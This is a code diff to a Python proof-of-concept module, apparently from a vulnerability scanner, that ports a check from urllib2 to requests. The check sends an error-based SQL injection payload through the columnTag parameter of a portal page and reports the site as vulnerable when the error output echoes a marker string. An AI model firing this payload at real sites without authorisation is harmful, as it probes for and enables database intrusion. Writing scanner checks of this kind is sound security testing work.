@@ -36,10 +36,9 @@ class Poc(ABPoc):
             #ref: http://wooyun.org/bugs/wooyun-2010-0106667
             payload = "/portal/dzjc/jsjy/list.aspx?columnTag=convert(int,%27tes%27%2b%27tvul%27)"
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
             
-            if req.getcode() == 500 and 'testvul' in content:
+            if req.status_code == 500 and 'testvul' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
